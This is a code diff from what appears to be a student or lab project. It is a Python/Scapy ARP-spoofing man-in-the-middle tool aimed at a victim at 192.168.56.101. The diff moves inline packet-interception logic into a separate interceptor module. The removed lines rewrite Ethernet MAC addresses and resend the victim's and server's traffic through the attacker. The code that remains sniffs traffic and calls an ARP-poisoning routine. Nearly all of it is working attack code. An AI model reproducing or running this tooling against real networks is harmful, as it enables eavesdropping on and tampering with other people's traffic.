@@ -6,6 +6,7 @@ import threading
 from threading import Lock
 import arpSpoof
 import util
+import interceptor
 
 lock = Lock()
 networkInterface = "enp0s3"
@@ -15,8 +16,6 @@ victimIP = "192.168.56.101"
 spoofIP = "192.168.56.102"
 #serverMAC = "08:00:27:c6:a4:61"
 
-#array for saving intersepted packets
-interceptedPkt = []
 
 
 # input : attacker MAC as str
@@ -43,30 +42,7 @@ class sniffer():
         sniff(prn=self.intercept, iface=networkInterface, filter="ip", timeout = 20)
 
     def intercept(self, pkt):
-
-        #update intercepted packet list
-        self.interceptedPkt.append(pkt)
-
-        #print("I got here")
-        #case 1: victim request an IP which has as destination MAC of attacker
-        # find corresponding MAC to that IP in array of spoffed IPs and
-        # put as destination to the new packet
-        print(pkt.show())
-        if pkt[Ether].dst == self.attackerMAC :
-            if pkt[IP].dst in  spoofIP:
-                pkt[Ether].dst = self.serverMAC[spoofIP.index(pkt[IP].dst)]
-            else:
-            #case 2: server response for the request of the victim
-            #so replace destination MAC to the MAC of victim
-                pkt[Ether].dst = self.victimMAC
-
-            #put src to attackerMAC as both arp tables of server and victim
-            #maintain requested IP andresses under attacker MAC
-            pkt[Ether].src = self.attackerMAC
-
-            # send packet to the network
-            sendp(pkt, iface=networkInterface)
-            print(pkt.show())
+        interceptor.intercept(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface)
 
     def spoof(self):
         arpSpoof.arpPoisoning(self.victimIP, self.spoofIP, self.networkInterface)
